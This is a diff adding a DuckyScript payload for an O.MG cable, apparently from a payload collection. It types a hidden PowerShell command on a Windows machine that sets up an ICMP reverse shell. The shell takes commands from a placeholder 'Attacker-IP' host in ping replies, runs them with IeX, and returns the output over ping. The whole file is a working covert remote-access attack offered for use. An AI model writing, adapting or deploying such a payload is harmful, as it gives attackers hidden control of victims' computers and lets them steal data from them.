@@ -1,0 +1,24 @@
+REM       PingZhellCable
+REM       Version 1.1
+REM       OS: Windows
+REM       Author: 0iphor13
+REM	  Requirements: OMG Firmware v.2.5 or higher
+
+REM       Getting remote access via ICMP
+
+DELAY 500
+DUCKY_LANG de
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -w hidden
+DELAY 500
+ENTER
+DELAY 500
+STRING $IP = 'Attacker-IP';
+DELAY 250
+STRING $Delay=5;$BufferSize=128;$ICMPCable=New-Object System.Net.NetworkInformation.Ping;$PingOMG=New-Object System.Net.NetworkInformation.PingOptions;$PingOMG.DontFragment = $True;$NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes('O.MG@PS '+(gl).Path+'> ');$ICMPCable.Send($IP,60 * 1000, $NeverGonnaGiveYouUp, $PingOMG) | Out-Null;while ($true){$NeverGonnaGiveYouUp=([text.encoding]::ASCII).GetBytes('');$reply=$ICMPCable.Send($IP,60 * 1000, $NeverGonnaGiveYouUp, $PingOMG);if ($reply.Buffer){$response=([text.encoding]::ASCII).GetString($reply.Buffer);$result=(IeX -Command $response 2>&1 | Out-String );$NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes($result);$index=[math]::floor($NeverGonnaGiveYouUp.length/$BufferSize);$i = 0;
+DELAY 250
+STRING if($NeverGonnaGiveYouUp.length -gt $BufferSize){while ($i -lt $index ){$NGGYU2 = $NeverGonnaGiveYouUp[($i*$BufferSize)..(($i+1)*$BufferSize-1)];$ICMPCable.Send($IP,60 * 10000, $NGGYU2, $PingOMG) | Out-Null;$i +=1;};$remainingindex=$NeverGonnaGiveYouUp.Length % $BufferSize;if($remainingindex -ne 0){$NGGYU2 = $NeverGonnaGiveYouUp[($i*$BufferSize)..($NeverGonnaGiveYouUp.Length)];$ICMPCable.Send($IP,60 * 10000, $NGGYU2, $PingOMG) | Out-Null}}else{$ICMPCable.Send($IP,60 * 10000, $NeverGonnaGiveYouUp, $PingOMG) | Out-Null};$NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes("`nO.MG@PS " + (pwd).Path + '> ');$ICMPCable.Send($IP,60 * 1000, $NeverGonnaGiveYouUp, $PingOMG) | Out-Null}else{Start-Sleep -Seconds $Delay}}
+DELAY 250
+ENTER
